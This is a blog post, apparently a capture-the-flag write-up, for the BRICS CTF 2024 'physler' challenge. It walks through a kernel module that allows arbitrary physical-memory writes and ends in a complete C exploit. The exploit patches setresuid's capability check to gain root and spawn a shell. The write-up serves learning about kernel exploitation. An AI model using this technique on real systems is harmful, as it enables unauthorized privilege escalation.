+++
title = 'physler - BRICS CTF 2024'
date = 2024-10-20T12:18:45+02:00
draft = false
+++

physler was another challenge from BRICS CTF that I solved.
we basically got a kernel module that has two ioctl requests defined:
```c
case IOCTL_MAP_PHYS_ADDR: {
    if (copy_from_user(&_map, (void*)arg, sizeof(_map))) {
        return -EFAULT;
    }

    if (mem)
        iounmap(mem);

    mem = ioremap(_map.phys_addr, _map.size);

    if (!mem) {
        return -EFAULT;
    }
    break;
}
case IOCTL_WRITE_PHYS_MEM: {
    if (!mem)
        return -EFAULT;

    if (copy_from_user(&_write, (void*)arg, sizeof(_write))) {
        return -EFAULT;
    }

    size = _write.size;

    if (size > sizeof(kernel_buffer))
        size = sizeof(kernel_buffer);

    if (copy_from_user(kernel_buffer, (char *)_write.in_data, size))
        return -EFAULT;

    memcpy_toio(mem, kernel_buffer, size);
    break;
}
```

this essentially lets us map any physical address and write arbitrary data to it - all as normal user
since this also bypasses all virtual access protections for pages/memory regions, we can overwrite
kernel code. to get the physical kernel base, we can read `/proc/iomem`:
```
00000000-00000fff : Reserved
00001000-0009fbff : System RAM
0009fc00-0009ffff : Reserved
000a0000-000bffff : PCI Bus 0000:00
000c0000-000c99ff : Video ROM
000ca000-000cadff : Adapter ROM
000cb000-000cb5ff : Adapter ROM
000f0000-000fffff : Reserved
  000f0000-000fffff : System ROM
00100000-05fdffff : System RAM
  01000000-023fffff : Kernel code
  02400000-02b5efff : Kernel rodata
  02c00000-0303327f : Kernel data
  03546000-039fffff : Kernel bss
05fe0000-05ffffff : Reserved
06000000-febfffff : PCI Bus 0000:00
  fd000000-fdffffff : 0000:00:02.0
  feb00000-feb7ffff : 0000:00:03.0
  feb80000-feb9ffff : 0000:00:03.0
  febb0000-febb0fff : 0000:00:02.0
fec00000-fec003ff : IOAPIC 0
fed00000-fed003ff : HPET 0
  fed00000-fed003ff : PNP0103:00
fffc0000-ffffffff : Reserved
100000000-17fffffff : PCI Bus 0000:00
```
to keep to exploit as simple as possible, I decided to patch a syscall of `setuid` family.
I chose `setresuid` since it updates most uid fields in the `cred` struct. it is obvoiulsy
priviliged, since you need `CAP_SETUID` to use it. see the following check in `__sys_setresuid`:
```c
if ((ruid_new || euid_new || suid_new) &&
	    !ns_capable_setid(old->user_ns, CAP_SETUID))
		return -EPERM;
```
this is the only check we need to overcome. if we manage to not take the branch, we can get root.
in disassembly, the relevant part looks like this:
```
0xffffffff8c10e043:	call   0xffffffff8c0fbeb0   # ns_capable_setid
0xffffffff8c10e048:	mov    ecx,DWORD PTR [rbp-0x38]
0xffffffff8c10e04b:	test   al,al
0xffffffff8c10e04d:	je     0xffffffff8c10e1e1 # return -EPERM;
```
normally when trying `setresuid(0, 0, 0)`, `al` will contain `0` and we return `-EPERM`. to bypass that,
we can patch the instruction before `test al,al`, which turned out to be unnecessary anyways.
instead of `mov ecx,DWORD PTR [rbp-0x38]`, I wrote `add eax, 1`, which are both 3 bytes long.
whith that, we don't jump to the return, and we continue in `__sys_setresuid`, which eventually sets our uid to `0`:
```
/ $ ./exp 
uid: 0
/ # 
```
we can read the flag now and solve the challenge. the exploit code is quite simple:
```c
#define _GNU_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>

#define IOCTL_MAP_PHYS_ADDR 0x1001
#define IOCTL_WRITE_PHYS_MEM 0x3003

struct ioctl_map {
    unsigned long phys_addr;
    unsigned long size;
};

struct ioctl_write {
    unsigned long size;
    unsigned char* in_data;
};

int map_phys(int fd, unsigned long phys_addr, unsigned long size) {
    struct ioctl_map *map = malloc(sizeof(struct ioctl_map));

    map->phys_addr = phys_addr;
    map->size = size;

    int ret = ioctl(fd, IOCTL_MAP_PHYS_ADDR, (void *)map);

    free(map);
    return ret;
}

int write_phys(int fd, unsigned char *data, unsigned long size) {
    struct ioctl_write *write = malloc(sizeof(struct ioctl_write));

    write->size = size;
    write->in_data = malloc(size + 1);
    memcpy(write->in_data, data, size);

    int ret = ioctl(fd, IOCTL_WRITE_PHYS_MEM, (void *)write);

    free(write->in_data);
    free(write);
    return ret;
}

int main() {
    int fd = open("/dev/physler", O_RDWR);

    char payload[0x1000];
    payload[0] = '\x83';
    payload[1] = '\xc0';
    payload[2] = '\x01';

    if(map_phys(fd, 0x1000000+0x10e048, 0x1000) < 0) // setresuid
        return -1;
    if(write_phys(fd, payload, 3))
        return -1;
    
    if(setresuid(0, 0, 0) < 0)
        perror("setresuid");
    
    printf("uid: %d\n", getuid());
    system("/bin/sh");

    return 0;
}
```